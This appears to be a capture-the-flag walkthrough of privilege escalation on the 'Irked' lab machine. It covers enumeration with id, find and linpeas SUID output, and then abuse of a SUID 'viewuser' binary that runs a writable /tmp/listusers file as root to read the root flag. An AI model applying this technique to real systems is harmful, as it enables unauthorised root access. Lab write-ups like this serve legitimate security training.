SSH
- djmardov
- `K<SNIP>G`

```
djmardov@irked:~$ whoami
djmardov
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$ sudo -l
-bash: sudo: command not found

```

# Groups
```
djmardov@irked:~$ find / -group lpadmin 2>/dev/null
/usr/share/ppd/custom
/run/cups/certs
```

## Linpeas snippets
```
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
pkexec version 0.105


╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-- 1 root messagebus 355K Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9.3K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 550K Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!)
-rwsr-xr-x 1 root root 1.1M Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 332K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 94K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.
0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 18K Sep  8  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-sr-x 1 root root 9.3K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary!)
-rwsr-xr-x 1 root root 95K Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 34K Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 158K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 26K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)



```

## viewuser
```
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-09-13 13:02 (:0)
djmardov pts/0        2025-09-13 13:12 (10.10.14.9)
sh: 1: /tmp/listusers: not found
```

The binary appears to look at /tmp/listusers, which does not exist

## Editing the code
Popping a command into `/tmp/listusers` gets executed by root when `viewuser` is ran
```
djmardov@irked:~$ echo 'cat /root/root.txt' > /tmp/listusers

djmardov@irked:~$ chmod 777 /tmp/listusers 
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-09-13 13:02 (:0)
djmardov pts/0        2025-09-13 13:12 (10.10.14.9)
ea<SNIP>fb



```



